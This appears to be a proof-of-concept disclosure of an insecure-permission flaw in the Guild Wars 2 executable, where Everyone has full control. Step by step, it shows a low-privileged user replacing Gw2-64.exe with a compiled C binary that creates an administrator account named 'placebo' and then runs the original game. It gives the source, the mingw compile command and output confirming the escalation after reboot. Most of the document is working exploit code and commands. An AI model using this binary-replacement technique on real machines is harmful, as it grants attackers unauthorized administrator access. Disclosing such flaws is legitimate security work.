## Insecure File Permission

D:\Guild Wars 2>icacls Gw2-64.exe
Gw2-64.exe Everyone:(F)
           Everyone:(I)(F)
           BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           NT AUTHORITY\Authenticated Users:(I)(M)
           BUILTIN\Users:(I)(RX)



#0.  Download & install 

#1.  Create low privileged user & change to the user
## As admin

C:\>net user lowpriv Password123! /add
C:\>net user lowpriv | findstr /i "Membership Name" | findstr /v "Full"
User name                    lowpriv
Local Group Memberships      *Users
Global Group memberships     *None

#2.  Move the Service EXE to a new name

D:\Guild Wars 2> whoami
lowpriv

D:\Guild Wars 2> move Gw2-64.exe Gw2-64.frey.exe
        1 file(s) moved.

#3.  Create malicious binary on kali linux
## Add Admin User C Code

   kali# cat addAdmin.c
     int main(void){
     system("net user placebo mypassword /add");
     system("net localgroup Administrators placebo /add");
     WinExec("D:\\Guild Wars 2\\Gw2-64.frey.exe",0);
    return 0;
    } 

## Compile Code
   kali# i686-w64-mingw32-gcc addAdmin.c -l ws2_32 -o Gw2-64.exe

#4. Transfer created 'Gw2-64' to the Windows Host 

#5. Move the created 'Gw2-64' binary to the 'D:\Guild Wars 2>' Folder

D:\Guild Wars 2> move C:\Users\lowpriv\Downloads\Gw2-64.exe .

#6. Check that exploit admin user doesn't exists

D:\Guild Wars 2> net user placebo

The user name could not be found

#6. Reboot the Computer

D:\Guild Wars 2> shutdown /r

#7. Login & look at that new Admin

C:\Users\lowpriv>net user placebo | findstr /i "Membership Name" | findstr /v "Full"

User name                    placebo
Local Group Memberships      *Administrators       *Users
Global Group memberships     *None
